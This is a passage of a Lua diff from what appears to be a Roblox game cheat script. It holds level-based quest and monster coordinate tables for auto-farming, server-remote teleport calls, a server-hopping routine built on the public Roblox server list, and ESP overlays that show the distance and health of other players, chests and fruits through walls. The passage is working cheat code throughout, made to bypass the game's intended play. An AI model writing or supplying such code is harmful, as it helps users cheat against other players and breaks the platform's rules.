+			CFrameQuest = CFrame.new(-2440.79639, 71.7140732, -3216.06812, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268);
+			CFrameMon = CFrame.new(-2821.372314453125, 75.89727783203125, -3070.089111328125);
+		elseif MyLevel == 900 or MyLevel <= 949 then
+			Mon = "Marine Captain";
+			LevelQuest = 2;
+			NameQuest = "MarineQuest3";
+			NameMon = "Marine Captain";
+			CFrameQuest = CFrame.new(-2440.79639, 71.7140732, -3216.06812, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268);
+			CFrameMon = CFrame.new(-1861.2310791015625, 80.17658233642578, -3254.697509765625);
+		elseif MyLevel == 950 or MyLevel <= 974 then
+			Mon = "Zombie";
+			LevelQuest = 1;
+			NameQuest = "ZombieQuest";
+			NameMon = "Zombie";
+			CFrameQuest = CFrame.new(-5497.06152, 47.5923004, -795.237061, -0.29242146, 0, -0.95628953, 0, 1, 0, 0.95628953, 0, -0.29242146);
+			CFrameMon = CFrame.new(-5657.77685546875, 78.96973419189453, -928.68701171875);
+		elseif MyLevel == 975 or MyLevel <= 999 then
+			Mon = "Vampire";
+			LevelQuest = 2;
+			NameQuest = "ZombieQuest";
+			NameMon = "Vampire";
+			CFrameQuest = CFrame.new(-5497.06152, 47.5923004, -795.237061, -0.29242146, 0, -0.95628953, 0, 1, 0, 0.95628953, 0, -0.29242146);
+			CFrameMon = CFrame.new(-6037.66796875, 32.18463897705078, -1340.6597900390625);
+		elseif MyLevel == 1000 or MyLevel <= 1049 then
+			Mon = "Snow Trooper";
+			LevelQuest = 1;
+			NameQuest = "SnowMountainQuest";
+			NameMon = "Snow Trooper";
+			CFrameQuest = CFrame.new(609.858826, 400.119904, -5372.25928, -0.374604106, 0, 0.92718488, 0, 1, 0, -0.92718488, 0, -0.374604106);
+			CFrameMon = CFrame.new(549.1473388671875, 427.3870544433594, -5563.69873046875);
+		elseif MyLevel == 1050 or MyLevel <= 1099 then
+			Mon = "Winter Warrior";
+			LevelQuest = 2;
+			NameQuest = "SnowMountainQuest";
+			NameMon = "Winter Warrior";
+			CFrameQuest = CFrame.new(609.858826, 400.119904, -5372.25928, -0.374604106, 0, 0.92718488, 0, 1, 0, -0.92718488, 0, -0.374604106);
+			CFrameMon = CFrame.new(1142.7451171875, 475.6398010253906, -5199.41650390625);
+		elseif MyLevel == 1100 or MyLevel <= 1124 then
+			Mon = "Lab Subordinate";
+			LevelQuest = 1;
+			NameQuest = "IceSideQuest";
+			NameMon = "Lab Subordinate";
+			CFrameQuest = CFrame.new(-6064.06885, 15.2422857, -4902.97852, 0.453972578, -0, -0.891015649, 0, 1, -0, 0.891015649, 0, 0.453972578);
+			CFrameMon = CFrame.new(-5707.4716796875, 15.951709747314453, -4513.39208984375);
+		elseif MyLevel == 1125 or MyLevel <= 1174 then
+			Mon = "Horned Warrior";
+			LevelQuest = 2;
+			NameQuest = "IceSideQuest";
+			NameMon = "Horned Warrior";
+			CFrameQuest = CFrame.new(-6064.06885, 15.2422857, -4902.97852, 0.453972578, -0, -0.891015649, 0, 1, -0, 0.891015649, 0, 0.453972578);
+			CFrameMon = CFrame.new(-6341.36669921875, 15.951770782470703, -5723.162109375);
+		elseif MyLevel == 1175 or MyLevel <= 1199 then
+			Mon = "Magma Ninja";
+			LevelQuest = 1;
+			NameQuest = "FireSideQuest";
+			NameMon = "Magma Ninja";
+			CFrameQuest = CFrame.new(-5428.03174, 15.0622921, -5299.43457, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213);
+			CFrameMon = CFrame.new(-5449.6728515625, 76.65874481201172, -5808.20068359375);
+		elseif MyLevel == 1200 or MyLevel <= 1249 then
+			Mon = "Lava Pirate";
+			LevelQuest = 2;
+			NameQuest = "FireSideQuest";
+			NameMon = "Lava Pirate";
+			CFrameQuest = CFrame.new(-5428.03174, 15.0622921, -5299.43457, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213);
+			CFrameMon = CFrame.new(-5213.33154296875, 49.73788070678711, -4701.451171875);
+		elseif MyLevel == 1250 or MyLevel <= 1274 then
+			Mon = "Ship Deckhand";
+			LevelQuest = 1;
+			NameQuest = "ShipQuest1";
+			NameMon = "Ship Deckhand";
+			CFrameQuest = CFrame.new(1037.80127, 125.092171, 32911.6016);
+			CFrameMon = CFrame.new(1212.0111083984375, 150.79205322265625, 33059.24609375);
+			if _G.AutoFarm and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(923.21252441406, 126.9760055542, 32852.83203125));
+			end;
+		elseif MyLevel == 1275 or MyLevel <= 1299 then
+			Mon = "Ship Engineer";
+			LevelQuest = 2;
+			NameQuest = "ShipQuest1";
+			NameMon = "Ship Engineer";
+			CFrameQuest = CFrame.new(1037.80127, 125.092171, 32911.6016);
+			CFrameMon = CFrame.new(919.4786376953125, 43.54401397705078, 32779.96875);
+			if _G.AutoFarm and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(923.21252441406, 126.9760055542, 32852.83203125));
+			end;
+		elseif MyLevel == 1300 or MyLevel <= 1324 then
+			Mon = "Ship Steward";
+			LevelQuest = 1;
+			NameQuest = "ShipQuest2";
+			NameMon = "Ship Steward";
+			CFrameQuest = CFrame.new(968.80957, 125.092171, 33244.125);
+			CFrameMon = CFrame.new(919.4385375976562, 129.55599975585938, 33436.03515625);
+			if _G.AutoFarm and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(923.21252441406, 126.9760055542, 32852.83203125));
+			end;
+		elseif MyLevel == 1325 or MyLevel <= 1349 then
+			Mon = "Ship Officer";
+			LevelQuest = 2;
+			NameQuest = "ShipQuest2";
+			NameMon = "Ship Officer";
+			CFrameQuest = CFrame.new(968.80957, 125.092171, 33244.125);
+			CFrameMon = CFrame.new(1036.0179443359375, 181.4390411376953, 33315.7265625);
+			if _G.AutoFarm and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(923.21252441406, 126.9760055542, 32852.83203125));
+			end;
+		elseif MyLevel == 1350 or MyLevel <= 1374 then
+			Mon = "Arctic Warrior";
+			LevelQuest = 1;
+			NameQuest = "FrostQuest";
+			NameMon = "Arctic Warrior";
+			CFrameQuest = CFrame.new(5667.6582, 26.7997818, -6486.08984, -0.933587909, 0, -0.358349502, 0, 1, 0, 0.358349502, 0, -0.933587909);
+			CFrameMon = CFrame.new(5966.24609375, 62.97002029418945, -6179.3828125);
+			if _G.AutoFarm and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
+				(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance", Vector3.new(-6508.5581054688, 5000.034996032715, -132.83953857422));
+			end;
+		elseif MyLevel == 1375 or MyLevel <= 1424 then
+			Mon = "Snow Lurker";
+			LevelQuest = 2;
+			NameQuest = "FrostQuest";
+			NameMon = "Snow Lurker";
+			CFrameQuest = CFrame.new(5667.6582, 26.7997818, -6486.08984, -0.933587909, 0, -0.358349502, 0, 1, 0, 0.358349502, 0, -0.933587909);
+			CFrameMon = CFrame.new(5407.07373046875, 69.19437408447266, -6880.88037109375);
+		elseif MyLevel == 1425 or MyLevel <= 1449 then
+			Mon = "Sea Soldier";
+			LevelQuest = 1;
+			NameQuest = "ForgottenQuest";
+			NameMon = "Sea Soldier";
+			CFrameQuest = CFrame.new(-3054.44458, 235.544281, -10142.8193, 0.990270376, -0, -0.13915664, 0, 1, -0, 0.13915664, 0, 0.990270376);
+			CFrameMon = CFrame.new(-3028.2236328125, 64.67451477050781, -9775.4267578125);
+		elseif MyLevel >= 1450 then
+			Mon = "Water Fighter";
+			LevelQuest = 2;
+			NameQuest = "ForgottenQuest";
+			NameMon = "Water Fighter";
+			CFrameQuest = CFrame.new(-3054.44458, 235.544281, -10142.8193, 0.990270376, -0, -0.13915664, 0, 1, -0, 0.13915664, 0, 0.990270376);
+			CFrameMon = CFrame.new(-3352.9013671875, 285.01556396484375, -10534.841796875);
+		end;
+	elseif World3 then
+		if MyLevel == 1500 or MyLevel <= 1524 then
+			Mon = "Pirate Millionaire";
+			LevelQuest = 1;
+			NameQuest = "PiratePortQuest";
+			NameMon = "Pirate Millionaire";
+			CFrameQuest = CFrame.new(-290.074677, 42.9034653, 5581.58984, 0.965929627, -0, -0.258804798, 0, 1, -0, 0.258804798, 0, 0.965929627);
+			CFrameMon = CFrame.new(-245.9963836669922, 47.30615234375, 5584.1005859375);
+		elseif MyLevel == 1525 or MyLevel <= 1574 then
+			Mon = "Pistol Billionaire";
+			LevelQuest = 2;
+			NameQuest = "PiratePortQuest";
+			NameMon = "Pistol Billionaire";
+			CFrameQuest = CFrame.new(-290.074677, 42.9034653, 5581.58984, 0.965929627, -0, -0.258804798, 0, 1, -0, 0.258804798, 0, 0.965929627);
+			CFrameMon = CFrame.new(-187.3301544189453, 86.23987579345703, 6013.513671875);
+		elseif MyLevel == 1575 or MyLevel <= 1599 then
+			Mon = "Dragon Crew Warrior";
+			LevelQuest = 1;
+			NameQuest = "AmazonQuest";
+			NameMon = "Dragon Crew Warrior";
+			CFrameQuest = CFrame.new(5832.83594, 51.6806107, -1101.51563, 0.898790359, -0, -0.438378751, 0, 1, -0, 0.438378751, 0, 0.898790359);
+			CFrameMon = CFrame.new(6141.140625, 51.35136413574219, -1340.738525390625);
+		elseif MyLevel == 1600 or MyLevel <= 1624 then
+			Mon = "Dragon Crew Archer [Lv. 1600]";
+			NameQuest = "AmazonQuest";
+			LevelQuest = 2;
+			NameMon = "Dragon Crew Archer";
+			CFrameQuest = CFrame.new(5833.1147460938, 51.60498046875, -1103.0693359375);
+			CFrameMon = CFrame.new(6616.41748046875, 441.7670593261719, 446.0469970703125);
+		elseif MyLevel == 1625 or MyLevel <= 1649 then
+			Mon = "Female Islander";
+			NameQuest = "AmazonQuest2";
+			LevelQuest = 1;
+			NameMon = "Female Islander";
+			CFrameQuest = CFrame.new(5446.8793945313, 601.62945556641, 749.45672607422);
+			CFrameMon = CFrame.new(4685.25830078125, 735.8078002929688, 815.3425903320312);
+		elseif MyLevel == 1650 or MyLevel <= 1699 then
+			Mon = "Giant Islander [Lv. 1650]";
+			NameQuest = "AmazonQuest2";
+			LevelQuest = 2;
+			NameMon = "Giant Islander";
+			CFrameQuest = CFrame.new(5446.8793945313, 601.62945556641, 749.45672607422);
+			CFrameMon = CFrame.new(4729.09423828125, 590.436767578125, -36.97627639770508);
+		elseif MyLevel == 1700 or MyLevel <= 1724 then
+			Mon = "Marine Commodore";
+			LevelQuest = 1;
+			NameQuest = "MarineTreeIsland";
+			NameMon = "Marine Commodore";
+			CFrameQuest = CFrame.new(2180.54126, 27.8156815, -6741.5498, -0.965929747, 0, 0.258804798, 0, 1, 0, -0.258804798, 0, -0.965929747);
+			CFrameMon = CFrame.new(2286.0078125, 73.13391876220703, -7159.80908203125);
+		elseif MyLevel == 1725 or MyLevel <= 1774 then
+			Mon = "Marine Rear Admiral [Lv. 1725]";
+			NameMon = "Marine Rear Admiral";
+			NameQuest = "MarineTreeIsland";
+			LevelQuest = 2;
+			CFrameQuest = CFrame.new(2179.98828125, 28.731239318848, -6740.0551757813);
+			CFrameMon = CFrame.new(3656.773681640625, 160.52406311035156, -7001.5986328125);
+		elseif MyLevel == 1775 or MyLevel <= 1799 then
+			Mon = "Fishman Raider";
+			LevelQuest = 1;
+			NameQuest = "DeepForestIsland3";
+			NameMon = "Fishman Raider";
+			CFrameQuest = CFrame.new(-10581.6563, 330.872955, -8761.18652, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213);
+			CFrameMon = CFrame.new(-10407.5263671875, 331.76263427734375, -8368.5166015625);
+		elseif MyLevel == 1800 or MyLevel <= 1824 then
+			Mon = "Fishman Captain";
+			LevelQuest = 2;
+			NameQuest = "DeepForestIsland3";
+			NameMon = "Fishman Captain";
+			CFrameQuest = CFrame.new(-10581.6563, 330.872955, -8761.18652, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213);
+			CFrameMon = CFrame.new(-10994.701171875, 352.38140869140625, -9002.1103515625);
+		elseif MyLevel == 1825 or MyLevel <= 1849 then
+			Mon = "Forest Pirate";
+			LevelQuest = 1;
+			NameQuest = "DeepForestIsland";
+			NameMon = "Forest Pirate";
+			CFrameQuest = CFrame.new(-13234.04, 331.488495, -7625.40137, 0.707134247, -0, -0.707079291, 0, 1, -0, 0.707079291, 0, 0.707134247);
+			CFrameMon = CFrame.new(-13274.478515625, 332.3781433105469, -7769.58056640625);
+		elseif MyLevel == 1850 or MyLevel <= 1899 then
+			Mon = "Mythological Pirate";
+			LevelQuest = 2;
+			NameQuest = "DeepForestIsland";
+			NameMon = "Mythological Pirate";
+			CFrameQuest = CFrame.new(-13234.04, 331.488495, -7625.40137, 0.707134247, -0, -0.707079291, 0, 1, -0, 0.707079291, 0, 0.707134247);
+			CFrameMon = CFrame.new(-13680.607421875, 501.08154296875, -6991.189453125);
+		elseif MyLevel == 1900 or MyLevel <= 1924 then
+			Mon = "Jungle Pirate";
+			LevelQuest = 1;
+			NameQuest = "DeepForestIsland2";
+			NameMon = "Jungle Pirate";
+			CFrameQuest = CFrame.new(-12680.3818, 389.971039, -9902.01953, -0.0871315002, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, -0.0871315002);
+			CFrameMon = CFrame.new(-12256.16015625, 331.73828125, -10485.8369140625);
+		elseif MyLevel == 1925 or MyLevel <= 1974 then
+			Mon = "Musketeer Pirate";
+			LevelQuest = 2;
+			NameQuest = "DeepForestIsland2";
+			NameMon = "Musketeer Pirate";
+			CFrameQuest = CFrame.new(-12680.3818, 389.971039, -9902.01953, -0.0871315002, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, -0.0871315002);
+			CFrameMon = CFrame.new(-13457.904296875, 391.545654296875, -9859.177734375);
+		elseif MyLevel == 1975 or MyLevel <= 1999 then
+			Mon = "Reborn Skeleton";
+			LevelQuest = 1;
+			NameQuest = "HauntedQuest1";
+			NameMon = "Reborn Skeleton";
+			CFrameQuest = CFrame.new(-9479.2168, 141.215088, 5566.09277, 0, 0, 1, 0, 1, -0, -1, 0, 0);
+			CFrameMon = CFrame.new(-8763.7236328125, 165.72299194335938, 6159.86181640625);
+		elseif MyLevel == 2000 or MyLevel <= 2024 then
+			Mon = "Living Zombie";
+			LevelQuest = 2;
+			NameQuest = "HauntedQuest1";
+			NameMon = "Living Zombie";
+			CFrameQuest = CFrame.new(-9479.2168, 141.215088, 5566.09277, 0, 0, 1, 0, 1, -0, -1, 0, 0);
+			CFrameMon = CFrame.new(-10144.1318359375, 138.62667846679688, 5838.0888671875);
+		elseif MyLevel == 2025 or MyLevel <= 2049 then
+			Mon = "Demonic Soul";
+			LevelQuest = 1;
+			NameQuest = "HauntedQuest2";
+			NameMon = "Demonic Soul";
+			CFrameQuest = CFrame.new(-9516.99316, 172.017181, 6078.46533, 0, 0, -1, 0, 1, 0, 1, 0, 0);
+			CFrameMon = CFrame.new(-9505.8720703125, 172.10482788085938, 6158.9931640625);
+		elseif MyLevel == 2050 or MyLevel <= 2074 then
+			Mon = "Posessed Mummy";
+			LevelQuest = 2;
+			NameQuest = "HauntedQuest2";
+			NameMon = "Posessed Mummy";
+			CFrameQuest = CFrame.new(-9516.99316, 172.017181, 6078.46533, 0, 0, -1, 0, 1, 0, 1, 0, 0);
+			CFrameMon = CFrame.new(-9582.0224609375, 6.251527309417725, 6205.478515625);
+		elseif MyLevel == 2075 or MyLevel <= 2099 then
+			Mon = "Peanut Scout";
+			LevelQuest = 1;
+			NameQuest = "NutsIslandQuest";
+			NameMon = "Peanut Scout";
+			CFrameQuest = CFrame.new(-2104.3908691406, 38.104167938232, -10194.21875, 0, 0, -1, 0, 1, 0, 1, 0, 0);
+			CFrameMon = CFrame.new(-2143.241943359375, 47.72198486328125, -10029.9951171875);
+		elseif MyLevel == 2100 or MyLevel <= 2124 then
+			Mon = "Peanut President";
+			LevelQuest = 2;
+			NameQuest = "NutsIslandQuest";
+			NameMon = "Peanut President";
+			CFrameQuest = CFrame.new(-2104.3908691406, 38.104167938232, -10194.21875, 0, 0, -1, 0, 1, 0, 1, 0, 0);
+			CFrameMon = CFrame.new(-1859.35400390625, 38.10316848754883, -10422.4296875);
+		elseif MyLevel == 2125 or MyLevel <= 2149 then
+			Mon = "Ice Cream Chef";
+			LevelQuest = 1;
+			NameQuest = "IceCreamIslandQuest";
+			NameMon = "Ice Cream Chef";
+			CFrameQuest = CFrame.new(-820.64825439453, 65.819526672363, -10965.795898438, 0, 0, -1, 0, 1, 0, 1, 0, 0);
+			CFrameMon = CFrame.new(-872.24658203125, 65.81957244873047, -10919.95703125);
+		elseif MyLevel == 2150 or MyLevel <= 2199 then
+			Mon = "Ice Cream Commander";
+			LevelQuest = 2;
+			NameQuest = "IceCreamIslandQuest";
+			NameMon = "Ice Cream Commander";
+			CFrameQuest = CFrame.new(-820.64825439453, 65.819526672363, -10965.795898438, 0, 0, -1, 0, 1, 0, 1, 0, 0);
+			CFrameMon = CFrame.new(-558.06103515625, 112.04895782470703, -11290.7744140625);
+		elseif MyLevel == 2200 or MyLevel <= 2224 then
+			Mon = "Cookie Crafter";
+			LevelQuest = 1;
+			NameQuest = "CakeQuest1";
+			NameMon = "Cookie Crafter";
+			CFrameQuest = CFrame.new(-2021.32007, 37.7982254, -12028.7295, 0.957576931, -0.0000000880302053, 0.288177818, 0.000000069301187, 1, 0.0000000751931211, -0.288177818, -0.000000052032135, 0.957576931);
+			CFrameMon = CFrame.new(-2374.13671875, 37.79826354980469, -12125.30859375);
+		elseif MyLevel == 2225 or MyLevel <= 2249 then
+			Mon = "Cake Guard";
+			LevelQuest = 2;
+			NameQuest = "CakeQuest1";
+			NameMon = "Cake Guard";
+			CFrameQuest = CFrame.new(-2021.32007, 37.7982254, -12028.7295, 0.957576931, -0.0000000880302053, 0.288177818, 0.000000069301187, 1, 0.0000000751931211, -0.288177818, -0.000000052032135, 0.957576931);
+			CFrameMon = CFrame.new(-1598.3070068359375, 43.773197174072266, -12244.5810546875);
+		elseif MyLevel == 2250 or MyLevel <= 2274 then
+			Mon = "Baking Staff";
+			LevelQuest = 1;
+			NameQuest = "CakeQuest2";
+			NameMon = "Baking Staff";
+			CFrameQuest = CFrame.new(-1927.91602, 37.7981339, -12842.5391, -0.96804446, 0.0000000422142143, 0.250778586, 0.0000000474911062, 1, 0.0000000149904711, -0.250778586, 0.0000000264211941, -0.96804446);
+			CFrameMon = CFrame.new(-1887.8099365234375, 77.6185073852539, -12998.3505859375);
+		elseif MyLevel == 2275 or MyLevel <= 2299 then
+			Mon = "Head Baker";
+			LevelQuest = 2;
+			NameQuest = "CakeQuest2";
+			NameMon = "Head Baker";
+			CFrameQuest = CFrame.new(-1927.91602, 37.7981339, -12842.5391, -0.96804446, 0.0000000422142143, 0.250778586, 0.0000000474911062, 1, 0.0000000149904711, -0.250778586, 0.0000000264211941, -0.96804446);
+			CFrameMon = CFrame.new(-2216.188232421875, 82.884521484375, -12869.2939453125);
+		elseif MyLevel == 2300 or MyLevel <= 2324 then
+			Mon = "Cocoa Warrior";
+			LevelQuest = 1;
+			NameQuest = "ChocQuest1";
+			NameMon = "Cocoa Warrior";
+			CFrameQuest = CFrame.new(233.22836303710938, 29.876001358032227, -12201.2333984375);
+			CFrameMon = CFrame.new(-21.55328369140625, 80.57499694824219, -12352.3876953125);
+		elseif MyLevel == 2325 or MyLevel <= 2349 then
+			Mon = "Chocolate Bar Battler";
+			LevelQuest = 2;
+			NameQuest = "ChocQuest1";
+			NameMon = "Chocolate Bar Battler";
+			CFrameQuest = CFrame.new(233.22836303710938, 29.876001358032227, -12201.2333984375);
+			CFrameMon = CFrame.new(582.590576171875, 77.18809509277344, -12463.162109375);
+		elseif MyLevel == 2350 or MyLevel <= 2374 then
+			Mon = "Sweet Thief";
+			LevelQuest = 1;
+			NameQuest = "ChocQuest2";
+			NameMon = "Sweet Thief";
+			CFrameQuest = CFrame.new(150.5066375732422, 30.693693161010742, -12774.5029296875);
+			CFrameMon = CFrame.new(165.1884765625, 76.05885314941406, -12600.8369140625);
+		elseif MyLevel == 2375 or MyLevel <= 2399 then
+			Mon = "Candy Rebel";
+			LevelQuest = 2;
+			NameQuest = "ChocQuest2";
+			NameMon = "Candy Rebel";
+			CFrameQuest = CFrame.new(150.5066375732422, 30.693693161010742, -12774.5029296875);
+			CFrameMon = CFrame.new(134.86563110351562, 77.2476806640625, -12876.5478515625);
+		elseif MyLevel == 2400 or MyLevel <= 2424 then
+			Mon = "Candy Pirate";
+			LevelQuest = 1;
+			NameQuest = "CandyQuest1";
+			NameMon = "Candy Pirate";
+			CFrameQuest = CFrame.new(-1150.0400390625, 20.378934860229492, -14446.3349609375);
+			CFrameMon = CFrame.new(-1310.5003662109375, 26.016523361206055, -14562.404296875);
+		elseif MyLevel == 2425 or MyLevel <= 2449 then
+			Mon = "Snow Demon";
+			LevelQuest = 2;
+			NameQuest = "CandyQuest1";
+			NameMon = "Snow Demon";
+			CFrameQuest = CFrame.new(-1150.0400390625, 20.378934860229492, -14446.3349609375);
+			CFrameMon = CFrame.new(-880.2006225585938, 71.24776458740234, -14538.609375);
+		elseif MyLevel == 2450 or MyLevel <= 2474 then
+			Mon = "Isle Outlaw";
+			LevelQuest = 1;
+			NameQuest = "TikiQuest1";
+			NameMon = "Isle Outlaw";
+			CFrameQuest = CFrame.new(-16547.748046875, 61.13533401489258, -173.41360473632812);
+			CFrameMon = CFrame.new(-16442.814453125, 116.13899993896484, -264.4637756347656);
+		elseif MyLevel == 2475 or MyLevel <= 2524 then
+			Mon = "Island Boy";
+			LevelQuest = 2;
+			NameQuest = "TikiQuest1";
+			NameMon = "Island Boy";
+			CFrameQuest = CFrame.new(-16547.748046875, 61.13533401489258, -173.41360473632812);
+			CFrameMon = CFrame.new(-16901.26171875, 84.06756591796875, -192.88906860351562);
+		elseif MyLevel == 2525 or MyLevel <= 2550 then
+			Mon = "Isle Champion";
+			LevelQuest = 2;
+			NameQuest = "TikiQuest2";
+			NameMon = "Isle Champion";
+			CFrameQuest = CFrame.new(-16539.078125, 55.68632888793945, 1051.5738525390625);
+			CFrameMon = CFrame.new(-16641.6796875, 235.7825469970703, 1031.282958984375);
+		end;
+	end;
+end;
+function Hop()
+	local PlaceID = game.PlaceId;
+	local AllIDs = {};
+	local foundAnything = "";
+	local actualHour = (os.date("!*t")).hour;
+	local Deleted = false;
+	function TPReturner()
+		local Site;
+		if foundAnything == "" then
+			Site = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. PlaceID .. "/servers/Public?sortOrder=Asc&limit=100"));
+		else
+			Site = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. PlaceID .. "/servers/Public?sortOrder=Asc&limit=100&cursor=" .. foundAnything));
+		end;
+		local ID = "";
+		if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
+			foundAnything = Site.nextPageCursor;
+		end;
+		local num = 0;
+		for i, v in pairs(Site.data) do
+			local Possible = true;
+			ID = tostring(v.id);
+			if tonumber(v.maxPlayers) > tonumber(v.playing) then
+				for _, Existing in pairs(AllIDs) do
+					if num ~= 0 then
+						if ID == tostring(Existing) then
+							Possible = false;
+						end;
+					elseif tonumber(actualHour) ~= tonumber(Existing) then
+						local delFile = pcall(function()
+							AllIDs = {};
+							table.insert(AllIDs, actualHour);
+						end);
+					end;
+					num = num + 1;
+				end;
+				if Possible == true then
+					table.insert(AllIDs, ID);
+					wait();
+					pcall(function()
+						wait();
+						(game:GetService("TeleportService")):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer);
+					end);
+					wait(4);
+				end;
+			end;
+		end;
+	end;
+	function Teleport()
+		while wait() do
+			pcall(function()
+				TPReturner();
+				if foundAnything ~= "" then
+					TPReturner();
+				end;
+			end);
+		end;
+	end;
+	Teleport();
+end;
+function UpdateIslandESP()
+	for i, v in pairs((game:GetService("Workspace"))._WorldOrigin.Locations:GetChildren()) do
+		pcall(function()
+			if IslandESP then
+				if v.Name ~= "Sea" then
+					if not v:FindFirstChild("NameEsp") then
+						local bill = Instance.new("BillboardGui", v);
+						bill.Name = "NameEsp";
+						bill.ExtentsOffset = Vector3.new(0, 1, 0);
+						bill.Size = UDim2.new(1, 200, 1, 30);
+						bill.Adornee = v;
+						bill.AlwaysOnTop = true;
+						local name = Instance.new("TextLabel", bill);
+						name.Font = "GothamBold";
+						name.FontSize = "Size14";
+						name.TextWrapped = true;
+						name.Size = UDim2.new(1, 0, 1, 0);
+						name.TextYAlignment = "Top";
+						name.BackgroundTransparency = 1;
+						name.TextStrokeTransparency = 0.5;
+						name.TextColor3 = Color3.fromRGB(7, 236, 240);
+					else
+						v.NameEsp.TextLabel.Text = v.Name .. "   \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude / 3) .. " Distance";
+					end;
+				end;
+			elseif v:FindFirstChild("NameEsp") then
+				(v:FindFirstChild("NameEsp")):Destroy();
+			end;
+		end);
+	end;
+end;
+function isnil(thing)
+	return thing == nil;
+end;
+local function round(n)
+	return math.floor(tonumber(n) + 0.5);
+end;
+Number = math.random(1, 1000000);
+function UpdatePlayerChams()
+	for i, v in pairs((game:GetService("Players")):GetChildren()) do
+		pcall(function()
+			if not isnil(v.Character) then
+				if ESPPlayer then
+					if not isnil(v.Character.Head) and (not v.Character.Head:FindFirstChild(("NameEsp" .. Number))) then
+						local bill = Instance.new("BillboardGui", v.Character.Head);
+						bill.Name = "NameEsp" .. Number;
+						bill.ExtentsOffset = Vector3.new(0, 1, 0);
+						bill.Size = UDim2.new(1, 200, 1, 30);
+						bill.Adornee = v.Character.Head;
+						bill.AlwaysOnTop = true;
+						local name = Instance.new("TextLabel", bill);
+						name.Font = Enum.Font.GothamSemibold;
+						name.FontSize = "Size14";
+						name.TextWrapped = true;
+						name.Text = v.Name .. " \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Character.Head.Position)).Magnitude / 3) .. " Distance";
+						name.Size = UDim2.new(1, 0, 1, 0);
+						name.TextYAlignment = "Top";
+						name.BackgroundTransparency = 1;
+						name.TextStrokeTransparency = 0.5;
+						if v.Team == game.Players.LocalPlayer.Team then
+							name.TextColor3 = Color3.new(0, 255, 0);
+						else
+							name.TextColor3 = Color3.new(255, 0, 0);
+						end;
+					else
+						v.Character.Head["NameEsp" .. Number].TextLabel.Text = v.Name .. " | " .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Character.Head.Position)).Magnitude / 3) .. " Distance\nHealth : " .. round(v.Character.Humanoid.Health * 100 / v.Character.Humanoid.MaxHealth) .. "%";
+					end;
+				elseif v.Character.Head:FindFirstChild("NameEsp" .. Number) then
+					(v.Character.Head:FindFirstChild("NameEsp" .. Number)):Destroy();
+				end;
+			end;
+		end);
+	end;
+end;
+function UpdateChestChams()
+	for i, v in pairs(game.Workspace:GetChildren()) do
+		pcall(function()
+			if string.find(v.Name, "Chest") then
+				if ChestESP then
+					if string.find(v.Name, "Chest") then
+						if not v:FindFirstChild(("NameEsp" .. Number)) then
+							local bill = Instance.new("BillboardGui", v);
+							bill.Name = "NameEsp" .. Number;
+							bill.ExtentsOffset = Vector3.new(0, 1, 0);
+							bill.Size = UDim2.new(1, 200, 1, 30);
+							bill.Adornee = v;
+							bill.AlwaysOnTop = true;
+							local name = Instance.new("TextLabel", bill);
+							name.Font = Enum.Font.GothamSemibold;
+							name.FontSize = "Size14";
+							name.TextWrapped = true;
+							name.Size = UDim2.new(1, 0, 1, 0);
+							name.TextYAlignment = "Top";
+							name.BackgroundTransparency = 1;
+							name.TextStrokeTransparency = 0.5;
+							if v.Name == "Chest1" then
+								name.TextColor3 = Color3.fromRGB(109, 109, 109);
+								name.Text = "Chest 1" .. " \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude / 3) .. " Distance";
+							end;
+							if v.Name == "Chest2" then
+								name.TextColor3 = Color3.fromRGB(173, 158, 21);
+								name.Text = "Chest 2" .. " \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude / 3) .. " Distance";
+							end;
+							if v.Name == "Chest3" then
+								name.TextColor3 = Color3.fromRGB(85, 255, 255);
+								name.Text = "Chest 3" .. " \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude / 3) .. " Distance";
+							end;
+						else
+							v["NameEsp" .. Number].TextLabel.Text = v.Name .. "   \n" .. round((((game:GetService("Players")).LocalPlayer.Character.Head.Position - v.Position)).Magnitude / 3) .. " Distance";
+						end;
+					end;
+				elseif v:FindFirstChild("NameEsp" .. Number) then
+					(v:FindFirstChild("NameEsp" .. Number)):Destroy();
+				end;
+			end;
+		end);
+	end;
+end;
+function UpdateDevilChams()
+	for i, v in pairs(game.Workspace:GetChildren()) do
+		pcall(function()
+			if DevilFruitESP then
+				if string.find(v.Name, "Fruit") then
